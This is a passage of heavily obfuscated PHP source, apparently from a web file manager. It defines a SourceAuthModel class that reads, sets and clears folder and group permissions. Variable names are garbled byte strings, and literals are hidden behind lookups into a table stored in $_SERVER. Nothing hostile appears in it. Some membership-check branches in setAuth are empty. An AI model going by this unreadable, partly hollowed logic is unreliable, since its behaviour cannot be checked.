$şæö·Ÿ[394]); $Èç’°Í” = array($şæö·Ÿ[394] => array($şæö·Ÿ[7], $¢¹º—Şà), $şæö·Ÿ[484] => 1); $ÒĞßøÉ = $this->where($Èç’°Í”)->field($şæö·Ÿ[479])->select(); if (empty($ÒĞßøÉ)) { return; } $†£Ê­Ó = array_to_keyvalue($ÒĞßøÉ, $şæö·Ÿ[12], $şæö·Ÿ[479]); $this->remove($†£Ê­Ó); } private function shareFileMeta($ Ûª, $ÁİÒÖ¿ = null) { $“…íà¸ =& $_SERVER[® ¨Ä®ñ]; $É«‹¹Öô = array($“…íà¸[458] => $ Ûª, $“…íà¸[95] => $“…íà¸[1977]); if (is_null($ÁİÒÖ¿)) { return Model($“…íà¸[1978])->where($É«‹¹Öô)->find(); } $É«‹¹Öô[$“…íà¸[369]] = $ÁİÒÖ¿; Model($“…íà¸[1978])->add($É«‹¹Öô, array(), !0); } } goto D‡‘¨Å›´; D‡‘¨Å›´: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\162\143\x65\x5f\x61\165\x74\x68"; public function getAuth($şïˆŒ¥¸) { $şºÄ¤½ï =& $_SERVER[® ¨Ä®ñ]; $¶‰²Ùà = $this->sourceAuthSelect($şïˆŒ¥¸); $ÔşÂåß¦ = array(); $æ¡¼ü‡½ = array(); $¡ƒÕÊ´“ = 2 << 25; foreach ($¶‰²Ùà as $ ¢¯—²ƒ) { $Ñ÷§ÌÛó = Model($şºÄ¤½ï[498])->listData($ ¢¯—²ƒ[$şºÄ¤½ï[1908]]); if (!$Ñ÷§ÌÛó) { continue; } $ÔşÂåß¦[] = $ ¢¯—²ƒ; $Ú×İ„ï‡ = 0; if ($ ¢¯—²ƒ[$şºÄ¤½ï[403]] == SourceModel::TYPE_GROUP) { $Ú×İ„ï‡ = $¡ƒÕÊ´“ * 2; } if ($ ¢¯—²ƒ[$şºÄ¤½ï[403]] == SourceModel::TYPE_USER) { $Ú×İ„ï‡ = $¡ƒÕÊ´“; } if ($ ¢¯—²ƒ[$şºÄ¤½ï[403]] == SourceModel::TYPE_USER && $ ¢¯—²ƒ[$şºÄ¤½ï[495]] == $şºÄ¤½ï[190]) { $Ú×İ„ï‡ = 0; } $æ¡¼ü‡½[] = $Ñ÷§ÌÛó[$şºÄ¤½ï[405]] + $Ú×İ„ï‡; } array_multisort($æ¡¼ü‡½, SORT_DESC, $ÔşÂåß¦); return $ÔşÂåß¦; } public function sourceAuthSelect($ö«ÄİÏÎ) { $ÄÀüà©Ò =& $_SERVER[® ¨Ä®ñ]; static $Ææ‚û´ı = array(); $í¸¶’“è = is_array($ö«ÄİÏÎ) ? !1 : !0; if ($í¸¶’“è) { $ö«ÄİÏÎ = array($ö«ÄİÏÎ); } $Æâ©­áÂ = array(); foreach ($ö«ÄİÏÎ as $™¤ˆ‚™) { if (isset($Ææ‚û´ı[$™¤ˆ‚™])) { $Æâ©­áÂ[$™¤ˆ‚™] = $Ææ‚û´ı[$™¤ˆ‚™]; } } if (count($Æâ©­áÂ) == count($ö«ÄİÏÎ)) { return $í¸¶’“è ? $Æâ©­áÂ[$ö«ÄİÏÎ[0]] : $Æâ©­áÂ; } $øÙş”û = $ÄÀüà©Ò[1979]; $£¹ôóËÙ = array($ÄÀüà©Ò[394] => array($ÄÀüà©Ò[7], $ö«ÄİÏÎ)); $í³êçª = $this->field($øÙş”û)->order($ÄÀüà©Ò[392])->where($£¹ôóËÙ)->select(); $Ê¡’ÏŸÈ = array_to_keyvalue_group($í³êçª, $ÄÀüà©Ò[394]); foreach ($ö«ÄİÏÎ as $™¤ˆ‚™) { $Ææ‚û´ı[$™¤ˆ‚™] = $Ê¡’ÏŸÈ[$™¤ˆ‚™] ? $Ê¡’ÏŸÈ[$™¤ˆ‚™] : array(); } if ($í¸¶’“è) { return $í³êçª; } return $Ê¡’ÏŸÈ; } public function setAuth($ßáò‡¦, $‹çŸš¼) { $Ø°Ëâà³ =& $_SERVER[® ¨Ä®ñ]; $şÓó¶ä¦ = Model($Ø°Ëâà³[1309])->sourceInfo($ßáò‡¦); if (!$şÓó¶ä¦) { return !1; } if ($şÓó¶ä¦[$Ø°Ëâà³[403]] != SourceModel::TYPE_GROUP) { return !1; } $œ±ø³ôğ = 1; $ô“ØŠ­ò = $şÓó¶ä¦[$Ø°Ëâà³[495]]; if ($ô“ØŠ­ò != $œ±ø³ôğ) { $šíŸˆû = array($Ø°Ëâà³[1807] => $ô“ØŠ­ò); $ùçŒßáŒ = Model($Ø°Ëâà³[1896])->field($Ø°Ëâà³[1639])->where($šíŸˆû)->select(); $ùçŒßáŒ = array_to_keyvalue($ùçŒßáŒ, $Ø°Ëâà³[12], $Ø°Ëâà³[1639]); } $®ì¹©” = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¹šæ½Á = array(); foreach ($‹çŸš¼ as $ìğ›ğÏ») { if (!in_array($ìğ›ğÏ»[$Ø°Ëâà³[403]], $®ì¹©”)) { show_json(LNG($Ø°Ëâà³[1980]), !1); } if ($ô“ØŠ­ò != $œ±ø³ôğ) { if ($ìğ›ğÏ»[$Ø°Ëâà³[403]] == SourceModel::TYPE_GROUP) { } if ($ìğ›ğÏ»[$Ø°Ëâà³[495]] != 0 && !in_array($ìğ›ğÏ»[$Ø°Ëâà³[495]], $ùçŒßáŒ)) { } } if ($ìğ›ğÏ»[$Ø°Ëâà³[495]] == 0) { $ìğ›ğÏ»[$Ø°Ëâà³[403]] = SourceModel::TYPE_USER; } $¹šæ½Á[] = array($Ø°Ëâà³[394] => $ßáò‡¦, $Ø°Ëâà³[403] => intval($ìğ›ğÏ»[$Ø°Ëâà³[403]]), $Ø°Ëâà³[495] => intval($ìğ›ğÏ»[$Ø°Ëâà³[495]]), $Ø°Ëâà³[1908] => intval($ìğ›ğÏ»[$Ø°Ëâà³[1908]]) ? intval($ìğ›ğÏ»[$Ø°Ëâà³[1908]]) : 0, $Ø°Ëâà³[1962] => intval($ìğ›ğÏ»[$Ø°Ëâà³[1962]]) ? intval($ìğ›ğÏ»[$Ø°Ëâà³[1962]]) : -1); } $this->where(array($Ø°Ëâà³[409] => $ßáò‡¦))->delete(); $this->addAll($¹šæ½Á); return !0; } public function authClear($ÅÉ»æ÷) { $Ïº·óø =& $_SERVER[® ¨Ä®ñ]; $¢ºı´˜Ÿ = Model($Ïº·óø[1309])->sourceInfo($ÅÉ»æ÷); $€Á£Íƒ‘ = array($ÅÉ»æ÷); if ($¢ºı´˜Ÿ[$Ïº·óø[402]] == $Ïº·óø[89]) { $™°¸ÃÕ = array($Ïº·óø[575] => array($Ïº·óø[535], $¢ºı´˜Ÿ[$Ïº·óø[512]] . $ÅÉ»æ÷ . $Ïº·óø[536])); $€Á£Íƒ‘ = Model($Ïº·óø[1309])->field($Ïº·óø[409])->where($™°¸ÃÕ)->getField($Ïº·óø[394], !0); $€Á£Íƒ‘[] = $ÅÉ»æ÷; } $this->where(array($Ïº·óø[409] => array($Ïº·óø[410], $€Á£Íƒ‘)))->delete(); return !0; } public function getAllChildren($÷—óÒ¡) { $ç±ºá¥é =& $_SERVER[® ¨Ä®ñ]; $å¼‰¸Ø† = Model($ç±ºá¥é[1309])->sourceInfo($÷—óÒ¡); if ($å¼‰¸Ø†[$ç±ºá¥é[402]] != $ç±ºá¥é[89]) { return $this->sourceListAuth(array($÷—óÒ¡)); } if ($å¼‰¸Ø†[$ç±ºá¥é[403]] != SourceModel::TYPE_GROUP) { return array(); } $üèæç‡ = 1; $µ„ì„Ÿ = array($÷—óÒ¡); if ($å¼‰¸Ø†[$ç±ºá¥é[489]] == $ç±ºá¥é[190] && $å¼‰¸Ø†[$ç±ºá¥é[495]] != $üèæç‡) { $µ„ì„Ÿ = $this->groupChidldAllRootSource($å¼‰¸Ø†[$ç±ºá¥é[495]]); } $ìé‚úğ = $this->field($ç±ºá¥é[394])->group($ç±ºá¥é[394])->select(); $ìé‚úğ = array_to_keyvalue($ìé‚úğ, $ç±ºá¥é[12], $ç±ºá¥é[394]); if (!$ìé‚úğ) { return array(); } $ÂØ‡úõ  = $ç±ºá¥é[1981]; $ÉÛ¶‡ = array($ç±ºá¥é[394] => array($ç±ºá¥é[7], $ìé‚úğ), $ç±ºá¥é[422] => $ç±ºá¥é[190]); $½¶êÕ”Ù = Model($ç±ºá¥é[807])->field($ÂØ‡úõ )->where($ÉÛ¶‡)->select(); $²®¿á¾Õ = array($÷—óÒ¡); foreach ($½¶êÕ”Ù as $»œÁ š¶) { foreach ($µ„ì„Ÿ as $¸ô›½¾) { $—–¡­†¦ = $ç±ºá¥é[50] . $¸ô›½¾ . $ç±ºá¥é[50]; $…³² = $»œÁ š¶[$ç±ºá¥é[512]] . $»œÁ š¶[$ç±ºá¥é[394]] . $ç±ºá¥é[50]; if (strstr($…³², $—–¡­†¦)) { $²®¿á¾Õ[] = $»œÁ š¶[$ç±ºá¥é[394]]; break; } } } return $this->sourceListAuth($²®¿á¾Õ); } private function sourceListAuth($Õíï·Ææ) { $á—°¹ÜĞ =& $_SERVER[® ¨Ä®ñ]; $£²ËÈØ¨ = Model($á—°¹ÜĞ[1309])->sourceListInfo($Õíï·Ææ, !0); $Óƒ£ª‚§ = $this->sourceAuthSelect($Õíï·Ææ); $¯™’”° = array(); $©îÊâƒì = array(); foreach ($£²ËÈØ¨ as $¤í¢²’) { unset($¤í¢²’[$á—°¹ÜĞ[445]]); unset($¤í¢²’[$á—°¹ÜĞ[443]]); unset($¤í¢²’[$á—°¹ÜĞ[405]]); unset($¤í¢²’[$á—°¹ÜĞ[87]]); $¹Öºá­ø = $Óƒ£ª‚§[$¤í¢²’[$á—°¹ÜĞ[394]]]; if (!$¹Öºá­ø) { continue; } $¤í¢²’[$á—°¹ÜĞ[1982]] = $this->authTargetInfo($¹Öºá­ø); $¤í¢²’[$á—°¹ÜĞ[510]] = rtrim($¤í¢²’[$á—°¹ÜĞ[516]], $á—°¹ÜĞ[8]) . $á—°¹ÜĞ[8] . ltrim($¤í¢²’[$á—°¹ÜĞ[510]], $á—°¹ÜĞ[8]); $¯™’”°[] = $¤í¢²’; $¿»ŞğøÁ = count(explode($á—°¹ÜĞ[8], trim($¤í¢²’[$á—°¹ÜĞ[510]], $á—°¹ÜĞ[8]))); $©îÊâƒì[] = $¿»ŞğøÁ + ($¤í¢²’[$á—°¹ÜĞ[33]] == $á—°¹ÜĞ[79] ? 0 : 1000); } array_multisort($©îÊâƒì, SORT_ASC, $¯™’”°); return $¯™’”°; } private function groupChidldAllRootSource($ÏÇ»òï) { $âè‹•Ì =& $_SERVER[® ¨Ä®ñ]; $‡ø°˜‘ = Model($âè‹•Ì[1983])->groupChildrenAll($ÏÇ»òï); $‡å—¦³¨ = array($âè‹•Ì[489] => 0, $âè‹•Ì[495] => array($âè‹•Ì[7], $‡ø°˜‘), $âè‹•Ì[403] => SourceModel::TYPE_GROUP); $¶Ñ¡Á¾½ = Model($âè‹•Ì[807])->field($âè‹•Ì[394])->where($‡å—¦³¨)->select(); $¶Ñ¡Á¾½ = array_to_keyvalue($¶Ñ¡Á¾½, $âè‹•Ì[12], $âè‹•Ì[394]); return $¶Ñ¡Á¾½; } private function authTargetInfo($şæĞí¢Ö) { $Ù›ì¸³Ñ =& $_SERVER[® ¨Ä®ñ]; $˜ï²×âå = array(); $¨¯éˆ«Ú = array(); $üèÏ£à = 2 << 25; foreach ($şæĞí¢Ö as $†ĞõÚçœ) { $Å­Šµş„ = Model($Ù›ì¸³Ñ[498])->listData($†ĞõÚçœ[$Ù›ì¸³Ñ[1908]]); if (!$Å­Šµş„) { continue; } if ($†ĞõÚçœ[$Ù›ì¸³Ñ[403]] == SourceModel::TYPE_USER) { $¼ûËîÉî = Model($Ù›ì¸³Ñ[504])->getInfoSimpleOuter($†ĞõÚçœ[$Ù›ì¸³Ñ[495]]); if ($¼ûËîÉî[$Ù›ì¸³Ñ[1639]] == $Ù›ì¸³Ñ[1172]) { continue; } if ($¼ûËîÉî[$Ù›ì¸³Ñ[1639]] == $Ù›ì¸³Ñ[190]) { $¼ûËîÉî[$Ù›ì¸³Ñ[32]] = LNG($Ù›ì¸³Ñ[1984]); } } else { $¼ûËîÉî = Model($Ù›ì¸³Ñ[513])->getInfoSimple($†ĞõÚçœ[$Ù›ì¸³Ñ[495]]); } if (!$¼ûËîÉî) { continue; } $¼ûËîÉî[$Ù›ì¸³Ñ[457]] = $Å­Šµş„; $˜ï²×âå[] = $¼ûËîÉî; $ÄŒ–¤Ùº = 0; if ($†ĞõÚçœ[$Ù›ì¸³Ñ[403]] == SourceModel::TYPE_GROUP) { $ÄŒ–¤Ùº = $üèÏ£à * 2; } if ($†ĞõÚçœ[$Ù›ì¸³Ñ[403]] == SourceModel::TYPE_USER) { $ÄŒ–¤Ùº = $üèÏ£à; } if ($†ĞõÚçœ[$Ù›ì¸³Ñ[403]] == SourceModel::TYPE_USER && $†ĞõÚçœ[$Ù›ì¸³Ñ[495]] == $Ù›ì¸³Ñ[190]) { $ÄŒ–¤Ùº = 0; } $¨¯éˆ«Ú[] = $Å­Šµş„[$Ù›ì¸³Ñ[405]] + $ÄŒ–¤Ùº; } array_multisort($¨¯éˆ«Ú, SORT_DESC, $˜ï²×âå); return $˜ï²×âå; } public function getAllChildrenByUser($ÌŠ¬â÷†, $ºÕ¥êƒ¶) { $¥òäé°  =& $_SERVER[® ¨Ä®ñ]; $ÙÀ‰Û€ü = Model($¥òäé° [529])->getInfo($ºÕ¥êƒ¶); if (!$ºÕ¥êƒ¶ || !$ÌŠ¬â÷† || !$ÙÀ‰Û€ü) { return array(); } $°¥•èŠÁ = Model($¥òäé° [1309])->sourceInfo($ÌŠ¬â÷†); $áÆÌ—ä = array(); $’ø§¸º  = 1; if ($°¥•èŠÁ[$¥òäé° [489]] == $¥òäé° [190] && $°¥•èŠÁ[$¥òäé° [495]] != $’ø§¸º  && $this->groupContainUser($°¥•èŠÁ[$¥òäé° [495]], $ºÕ¥êƒ¶)) { foreach ($ÙÀ‰Û€ü[$¥òäé° [1985]] as $šì¬Èó) { $í÷èıÆî = Model($¥òäé° [513])->getInfo($šì¬Èó[$¥òäé° [1807]]); $­îãÍ»« = Model($¥òäé° [529])->getInfoSimpleOuter($ºÕ¥êƒ¶); $­îãÍ»«[$¥òäé° [457]] = $šì¬Èó[$¥òäé° [405]]; if (Model($¥òäé° [498])->authCheckAction($šì¬Èó[$¥òäé° [405]][$¥òäé° [405]], $¥òäé° [1827])) { continue; } $ÒÃù´ É = array($¥òäé° [32] => $¥òäé° [1588] . $í÷èıÆî[$¥òäé° [32]], $¥òäé° [394] => $í÷èıÆî[$¥òäé° [87]][$¥òäé° [394]], $¥òäé° [78] => KodIO::make($í÷èıÆî[$¥òäé° [87]][$¥òäé° [394]]), $¥òäé° [489] => $¥òäé° [190], $¥òäé° [403] => $¥òäé° [506], $¥òäé° [33] => $¥òäé° [539], $¥òäé° [510] => $í÷èıÆî[$¥òäé° [517]], $¥òäé° [1807] => $í÷èıÆî[$¥òäé° [1807]], $¥òäé° [514] => $í÷èıÆî[$¥òäé° [489]], $¥òäé° [1982] => array($­îãÍ»«)); $áÆÌ—ä[$ÒÃù´ É[$¥òäé° [394]]] = $ÒÃù´ É; } } $…¸ŒËİ½ = array(); $ÚÒíëš = $this->getAllChildren($ÌŠ¬â÷†); foreach ($ÚÒíëš as $¤¯ïìœé) { $ŸÖÇ   = !1; foreach ($¤¯ïìœé[$¥òäé° [1982]] as $°üğ›Šº) { if ($°üğ›Šº[$¥òäé° [1639]]) { if ($°üğ›Šº[$¥òäé° [1639]] == $ºÕ¥êƒ¶) { $ŸÖÇ   = !0; break; } } if ($°üğ›Šº[$¥òäé° [1807]]) { if ($this->groupContainUser($°üğ›Šº[$¥òäé° [1807]], $ºÕ¥êƒ¶)) { $ŸÖÇ   = !0; break; } } } if ($ŸÖÇ  ) { $…¸ŒËİ½[] = $¤¯ïìœé; } $»Ä­šÃ³ = $¤¯ïìœé[$¥òäé° [394]]; if (isset($áÆÌ—ä[$»Ä­šÃ³])) { $¤¯ïìœé[$¥òäé° [1982]][] = $áÆÌ—ä[$»Ä­šÃ³][0]; $áÆÌ—ä[$»Ä­šÃ³] = !1; } } $áÆÌ—ä = array_filter(array_values($áÆÌ—ä)); $…¸ŒËİ½ = array_merge($áÆÌ—ä, $…¸ŒËİ½); return $…¸ŒËİ½; } public function setAllChildrenByUser($ÇÚ§áÑ, $¨¤ô¼ïÍ, $Š†‡¦©ƒ) { $Î‹‡±› =& $_SERVER[® ¨Ä®ñ]; $Ú°àá‚ = $this->getAllChildrenByUser($ÇÚ§áÑ, $¨¤ô¼ïÍ); if (!$Š†‡¦©ƒ || !$Ú°àá‚) { return !1; } foreach ($Ú°àá‚ as $‚‚×Ğµ«) { $…ë‰©¥¾ = array(); foreach ($‚‚×Ğµ«[$Î‹‡±›[1982]] as $äÖ™„²Ò) { $Û´¯Öøà = $äÖ™„²Ò[$Î‹‡±›[457]]; $ˆĞ»ñÆï = $äÖ™„²Ò[$Î‹‡±›[1639]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Õ—Ï™Í = $äÖ™„²Ò[$Î‹‡±›[1639]] ? $äÖ™„²Ò[$Î‹‡±›[1639]] : $äÖ™„²Ò[$Î‹‡±›[1807]]; if ($äÖ™„²Ò[$Î‹‡±›[1639]] && $äÖ™„²Ò[$Î‹‡±›[1639]] == $¨¤ô¼ïÍ) { continue; } $…ë‰©¥¾[] = array($Î‹‡±›[394] => $‚‚×Ğµ«[$Î‹‡±›[394]], $Î‹‡±›[403] => $ˆĞ»ñÆï, $Î‹‡±›[495] => intval($Õ—Ï™Í), $Î‹‡±›[1908] => isset($Û´¯Öøà[$Î‹‡±›[392]]) ? intval($Û´¯Öøà[$Î‹‡±›[392]]) : 0, $Î‹‡±›[1962] => isset($Û´¯Öøà[$Î‹‡±›[1962]]) ? intval($Û´¯Öøà[$Î‹‡±›[1962]]) : -1); } $…ë‰©¥¾[] = array($Î‹‡±›[394] => $‚‚×Ğµ«[$Î‹‡±›[394]], $Î‹‡±›[403] => SourceModel::TYPE_USER, $Î‹‡±›[495] => intval($¨¤ô¼ïÍ), $Î‹‡±›[1908] => intval($Š†‡¦©ƒ), $Î‹‡±›[1962] => -1); $this->where(array($Î‹‡±›[409] => $‚‚×Ğµ«[$Î‹‡±›[394]]))->delete(); $this->addAll($…ë‰©¥¾); } return !0; } public function get($­¹ˆÊ£á) { $ªîÄÄñ¤ = $this->getSourceList(array($­¹ˆÊ£á), !0); return $ªîÄÄñ¤[0]; } public function getSourceList($æ¦§İ×», $Å×­˜ÎÊ = false, $ÏáöÉ‘ = false) { $ì±Æ…ö‘ =& $_SERVER[® ¨Ä®ñ]; if (!$æ¦§İ×») { return array(); } $È¢«Ó” = Model($ì±Æ…ö‘[1309]); if (!$Å×­˜ÎÊ && count($æ¦§İ×») == 1) { $Å×­˜ÎÊ = array(); $Å×­˜ÎÊ[$æ¦§İ×»[0]] = $È¢«Ó”->sourceInfo($æ¦§İ×»[0]); } if (!$Å×­˜ÎÊ) { $ıöİ×š = array($ì±Æ…ö‘[409] => array($ì±Æ…ö‘[410], $æ¦§İ×»)); $Å×­˜ÎÊ = $È¢«Ó”->field($ì±Æ…ö‘[1986])->where($ıöİ×š)->select(); $Å×­˜ÎÊ = array_to_keyvalue($Å×­˜ÎÊ, $ì±Æ…ö‘[394]); } $ÒâÀîıÂ = $æ¦§İ×»; foreach ($Å×­˜ÎÊ as $ÖØ´äè¡ => $«Ä—±á¯) { $ø¿ô—Ÿ£ = $È¢«Ó”->parentLevelArray($«Ä—±á¯[$ì±Æ…ö‘[512]]); $ÒâÀîıÂ = array_merge($ÒâÀîıÂ, array($ÖØ´äè¡), array_reverse($ø¿ô—Ÿ£)); } $ÒâÀîıÂ = array_values(array_unique($ÒâÀîıÂ)); if (!$ÒâÀîıÂ) { return array(); } $‰óá¯… = $this->sourceAuthSelect($ÒâÀîıÂ); $×‹¹ÛÙ‹ = array(); foreach ($ÒâÀîıÂ as $âş¹Õ»æ) { if (isset($‰óá¯…[$âş¹Õ»æ])) { $×‹¹ÛÙ‹[$âş¹Õ»æ] = $‰óá¯…[$âş¹Õ»æ]; } } $Ú—İË»Ã = $this->userIsRoot($ÏáöÉ‘); $Ó¢ÎÙÖö = AuthModel::authAll(); $ …†¼ = array($ì±Æ…ö‘[406] => $Ó¢ÎÙÖö, $ì±Æ…ö‘[1987] => array($ì±Æ…ö‘[411] => 0, $ì±Æ…ö‘[1813] => $Ó¢ÎÙÖö, $ì±Æ…ö‘[412] => LNG($ì±Æ…ö‘[1988]), $ì±Æ…ö‘[1829] => $ì±Æ…ö‘[1989])); $ÔïÕí„Â = array(); foreach ($Å×­˜ÎÊ as $âş¹Õ»æ => $Šƒå€¸ü) { if ($Ú—İË»Ã) { $ÔïÕí„Â[$âş¹Õ»æ] = $ …†¼; continue; } $ÔïÕí„Â[$âş¹Õ»æ] = $this->makeSourceAuth($Šƒå€¸ü, $×‹¹ÛÙ‹, $ÏáöÉ‘); } return $ÔïÕí„Â; } public function authDeepCheck($†õø”œö, $ÃêİÁöÔ = false) { $±€şØ©¬ =& $_SERVER[® ¨Ä®ñ]; $ÃêİÁöÔ = $ÃêİÁöÔ ? $ÃêİÁöÔ : USER_ID; $èèÚØÚÒ = $this->makeAuthDeep($ÃêİÁöÔ); if (!in_array($†õø”œö, $èèÚØÚÒ[$±€şØ©¬[1990]])) { return !1; } $ï×‘ÁÛ = array(); foreach ($èèÚØÚÒ[$±€şØ©¬[1991]] as $«÷‹­Åü => $Ùª•ë£ä) { if (!in_array($†õø”œö, $Ùª•ë£ä)) { continue; } $ï×‘ÁÛ[] = $«÷‹­Åü; } if (!$ï×‘ÁÛ) { return !1; } $Ô§ä¢ï = $ï×‘ÁÛ ? $ï×‘ÁÛ[0] : $†õø”œö; return array($±€şØ©¬[406] => -1, $±€şØ©¬[457] => array($±€şØ©¬[411] => $±€şØ©¬[1172], $±€şØ©¬[1813] => $±€şØ©¬[190], $±€şØ©¬[412] => LNG($±€şØ©¬[1992]), $±€şØ©¬[1829] => $±€şØ©¬[1993]), $±€şØ©¬[1994] => LNG($±€şØ©¬[1995]), $±€şØ©¬[1996] => $this->sourceAuthInfo($Ô§ä¢ï)); } protected function makeAuthDeep($Æİú£ÌĞ = false) { $Ú­åâ×Õ =& $_SERVER[® ¨Ä®ñ]; static $‹ òîè = array(); $Æİú£ÌĞ = $Æİú£ÌĞ ? $Æİú£ÌĞ : USER_ID; if (isset($‹ òîè[$Æİú£ÌĞ])) { return $‹ òîè[$Æİú£ÌĞ]; } $ä¯ÃµÓ = Model($Ú­åâ×Õ[1997])->listData(); $¬“ØÖŒŸ = array(); foreach ($ä¯ÃµÓ as $üıí¾Ù) { if ($üıí¾Ù[$Ú­åâ×Õ[405]] == 0 && $üıí¾Ù[$Ú­åâ×Õ[1828]] == $Ú­åâ×Õ[89]) { $¬“ØÖŒŸ[] = $üıí¾Ù[$Ú­åâ×Õ[392]]; } } $’ºÀ´–Ñ = $this->userGroupParents($Æİú£ÌĞ); $ƒ”İÃ¨¬ = array($Ú­åâ×Õ[403] => SourceModel::TYPE_USER, $Ú­åâ×Õ[495] => $Æİú£ÌĞ); if ($’ºÀ´–Ñ) { $ƒ”İÃ¨¬ = array(array($Ú­åâ×Õ[403] => SourceModel::TYPE_USER, $Ú­åâ×Õ[495] => $Æİú£ÌĞ), array($Ú­åâ×Õ[403] => SourceModel::TYPE_GROUP, $Ú­åâ×Õ[495] => array($Ú­åâ×Õ[410], $’ºÀ´–Ñ)), $Ú­åâ×Õ[984] => $Ú­åâ×Õ[1902]); } $šÃÓáµ = $this->field($Ú­åâ×Õ[1998])->where($ƒ”İÃ¨¬)->select(); $ìĞ‡İœŠ = array(); $Ÿ¨©ıÈë = array_to_keyvalue_group($šÃÓáµ, $Ú­åâ×Õ[394]); foreach ($Ÿ¨©ıÈë as $öÑÚŠÍÃ => $àœ¢ì‡¤) { $¿“Ôú°» = $this->authArrayCheck($àœ¢ì‡¤, $Æİú£ÌĞ); if ($¿“Ôú°»[$Ú­åâ×Õ[406]] > 0) { $ìĞ‡İœŠ[] = $öÑÚŠÍÃ . $Ú­åâ×Õ[12]; } } if ($’ºÀ´–Ñ) { $Ûıë‡ô = Model($Ú­åâ×Õ[513]); foreach ($’ºÀ´–Ñ as $íÁßÒ‹) { $ÏºŒÀ±Á = $Ûıë‡ô->getInfo($íÁßÒ‹); if (!$ÏºŒÀ±Á || !is_array($ÏºŒÀ±Á[$Ú­åâ×Õ[87]])) { continue; } $ìĞ‡İœŠ[] = $ÏºŒÀ±Á[$Ú­åâ×Õ[87]][$Ú­åâ×Õ[394]]; } } $¥àïÁ¾ô = array(); $ßŒ˜Û´ = $’ºÀ´–Ñ; $Œ”»èÒİ = Model($Ú­åâ×Õ[1309]); $Ûıë‡ô = Model($Ú­åâ×Õ[513]); $²ºáôôŞ = array(); $ºÜ›ÛÈĞ = array(); $Ñ“ÛÀÎ = array(); $Ò¡«ÇÙÊ = array(); if ($ìĞ‡İœŠ) { $›Å¯õÎ‰ = $Œ”»èÒİ->where(array($Ú­åâ×Õ[394] => array($Ú­åâ×Õ[410], $ìĞ‡İœŠ)))->select(); foreach ($›Å¯õÎ‰ as $şİÇöâˆ) { $¡¿Â Õ = $Œ”»èÒİ->parentLevelArray($şİÇöâˆ[$Ú­åâ×Õ[512]]); $¥àïÁ¾ô = array_merge($¥àïÁ¾ô, $¡¿Â Õ); $ßŒ˜Û´[] = $şİÇöâˆ[$Ú­åâ×Õ[495]]; $²ºáôôŞ[$şİÇöâˆ[$Ú­åâ×Õ[394]]] = $¡¿Â Õ; $ºÜ›ÛÈĞ[$şİÇöâˆ[$Ú­åâ×Õ[394]]] = $şİÇöâˆ[$Ú­åâ×Õ[495]]; } } $ßŒ˜Û´ = array_values(array_unique($ßŒ˜Û´)); $ŸÏ²êú™ = $ßŒ˜Û´; foreach ($ŸÏ²êú™ as $íÁßÒ‹) { $ÏºŒÀ±Á = $Ûıë‡ô->getInfo($íÁßÒ‹); $¡¿Â Õ = $Œ”»èÒİ->parentLevelArray($ÏºŒÀ±Á[$Ú­åâ×Õ[512]]); $ßŒ˜Û´ = array_merge($ßŒ˜Û´, $¡¿Â Õ); } $ßŒ˜Û´ = array_values(array_unique($ßŒ˜Û´)); foreach ($ßŒ˜Û´ as $íÁßÒ‹) { $ÏºŒÀ±Á = $Ûıë‡ô->getInfo($íÁßÒ‹); $¥àïÁ¾ô[] = $ÏºŒÀ±Á[$Ú­åâ×Õ[87]][$Ú­åâ×Õ[394]]; $Ñ“ÛÀÎ[$íÁßÒ‹] = $ÏºŒÀ±Á[$Ú­åâ×Õ[87]][$Ú­åâ×Õ[394]]; $Ò¡«ÇÙÊ[$íÁßÒ‹] = $Œ”»èÒİ->parentLevelArray($ÏºŒÀ±Á[$Ú­åâ×Õ[512]]); } foreach ($²ºáôôŞ as $·ÅéúÏÜ => $ÏÂšææ®) { $¸Ï‘ŒÈ¯ = $ºÜ›ÛÈĞ[$·ÅéúÏÜ]; if (!$¸Ï‘ŒÈ¯ || !$Ñ“ÛÀÎ[$¸Ï‘ŒÈ¯]) { continue; } $Å×ß–ëÇ = array(); foreach ($Ò¡«ÇÙÊ[$¸Ï‘ŒÈ¯] as $íÁßÒ‹) { $Å×ß–ëÇ[] = $Ñ“ÛÀÎ[$íÁßÒ‹]; } $²ºáôôŞ[$·ÅéúÏÜ] = array_merge($Å×ß–ëÇ, $ÏÂšææ®); } $¥àïÁ¾ô = array_values(array_unique($¥àïÁ¾ô)); $’Ô¦ùİó = array($Ú­åâ×Õ[1990] => $¥àïÁ¾ô, $Ú­åâ×Õ[1991] => $²ºáôôŞ); $‹ òîè[$Æİú£ÌĞ] = $’Ô¦ùİó; return $’Ô¦ùİó; } private function makeSourceAuth($®ÍÌ©‚×, $†æøüÕ, $È‰‰—¢ü = false) { $âÎñ¿¡© =& $_SERVER[® ¨Ä®ñ]; $ŠÖûˆõğ = $âÎñ¿¡©[89]; $êñ‰Æ»Œ = $®ÍÌ©‚×[$âÎñ¿¡©[495]]; $·òÄÚ…Í = $®ÍÌ©‚×[$âÎñ¿¡©[403]] == SourceModel::TYPE_GROUP; $ˆÅ¢µãÜ = $·òÄÚ…Í ? $this->groupRootAuth($êñ‰Æ»Œ, $È‰‰—¢ü) : !1; if ($ˆÅ¢µãÜ && Model($âÎñ¿¡©[498])->authCheckAction($ˆÅ¢µãÜ[$âÎñ¿¡©[405]], $âÎñ¿¡©[1827])) { return $this->groupAuthInfo($ˆÅ¢µãÜ, $êñ‰Æ»Œ); } $º¡íÀ¯ = Model($âÎñ¿¡©[1309])->parentLevelArray($®ÍÌ©‚×[$âÎñ¿¡©[512]]); $º¡íÀ¯ = array_merge(array($®ÍÌ©‚×[$âÎñ¿¡©[394]]), array_reverse($º¡íÀ¯)); $Î§Š¸Ãí = !1; foreach ($º¡íÀ¯ as $‘Óğİ„—) { if (!isset($†æøüÕ[$‘Óğİ„—])) { continue; } $Æ¦éÎ›œ = $this->authMake($†æøüÕ[$‘Óğİ„—], $È‰‰—¢ü); if ($Æ¦éÎ›œ[$âÎñ¿¡©[457]]) { $Î§Š¸Ãí = $Æ¦éÎ›œ; break; } } if (!$·òÄÚ…Í) { return $Î§Š¸Ãí; } if (!$Î§Š¸Ãí && $ˆÅ¢µãÜ) { $Î§Š¸Ãí = $this->groupAuthInfo($ˆÅ¢µãÜ, $êñ‰Æ»Œ); } if (!$Î§Š¸Ãí) { $ƒÂĞÙ”Æ = Model($âÎñ¿¡©[513])->getInfo($êñ‰Æ»Œ); $¿¨–ê = 